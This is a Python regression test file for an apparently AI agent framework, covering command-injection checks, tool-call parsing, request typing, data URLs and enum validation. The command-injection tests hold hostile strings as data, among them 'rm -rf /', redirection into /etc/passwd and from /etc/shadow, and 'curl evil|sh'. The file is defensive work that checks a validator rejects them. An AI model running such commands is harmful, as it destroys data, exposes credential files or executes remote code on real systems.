"""Regression tests for issues found by the qwable-audit workflow.

Each test pins a confirmed bug fix so it cannot silently regress.
"""

from qwable.action_parser import parse_action_from_text
from qwable.fusion_request import extract_fusion_request
from qwable.patch_protocol import is_test_command, validate_tool_call
from qwable.tool_validation import validate_tool_call as validate_args
from qwable.vision import image_from_url_value


# ── patch_protocol: command-injection via &, redirection, newlines (#17/#18) ──

def test_is_test_command_rejects_background_and_redirection():
    assert is_test_command("python -m pytest")
    assert is_test_command("pytest -q tests/")
    assert not is_test_command("pytest & rm -rf /")
    assert not is_test_command("pytest > /etc/passwd")
    assert not is_test_command("pytest < /etc/shadow")
    assert not is_test_command("pytest >> out.log")


def test_is_test_command_rejects_embedded_newline():
    assert not is_test_command("pytest\nrm -rf /")
    assert not is_test_command("pytest\r\ncurl evil|sh")


def test_validate_tool_call_blocks_redirection_shell():
    ok, reason = validate_tool_call("shell", {"command": "pytest > /etc/passwd"})
    assert not ok


# ── action_parser: malformed native tool_calls must not crash (#2 + likely) ──

def test_parse_action_malformed_tool_calls_does_not_crash():
    tools = [{"type": "function", "function": {"name": "x", "parameters": {}}}]
    # first element not a dict
    a = parse_action_from_text({"tool_calls": ["x"]}, tools)
    assert a.type == "final_answer"
    # function not a dict
    b = parse_action_from_text({"tool_calls": [{"function": "bad"}]}, tools)
    assert b.type == "final_answer"
    # choices[0] not a dict
    c = parse_action_from_text({"choices": ["nope"]}, tools)
    assert c.type == "final_answer"


# ── fusion_request: type validation at the boundary (#12) ──

def test_extract_fusion_request_ignores_bad_types():
    r = extract_fusion_request({"fusion": {"analysis_models": "qwen", "judge_model": 5, "preset": 7}})
    assert r.analysis_models is None  # a bare string must NOT fan out per-character
    assert r.judge_model is None
    assert r.preset is None


def test_extract_fusion_request_accepts_valid_block():
    r = extract_fusion_request({"fusion": {"analysis_models": ["a", "b"], "judge_model": "j", "preset": "quality"}})
    assert r.analysis_models == ["a", "b"]
    assert r.judge_model == "j"
    assert r.preset == "quality"


# ── vision: data URL with empty / parameterized media type (#16) ──

def test_image_from_url_value_accepts_empty_and_parameterized_media_type():
    img = image_from_url_value("openai_responses", "data:;base64,QUJD")
    assert img is not None and img.data_base64 == "QUJD"
    img2 = image_from_url_value("openai_responses", "data:image/png;charset=utf-8;base64,QUJD")
    assert img2 is not None and img2.data_base64 == "QUJD"


# ── tool_validation: minimal validator enforces enum (#3) ──

def test_minimal_validator_enforces_enum():
    tools = [{"name": "t", "input_schema": {
        "type": "object",
        "properties": {"mode": {"type": "string", "enum": ["a", "b"]}},
    }}]
    ok, _ = validate_args("t", {"mode": "a"}, tools)
    assert ok
    bad, err = validate_args("t", {"mode": "z"}, tools)
    assert not bad
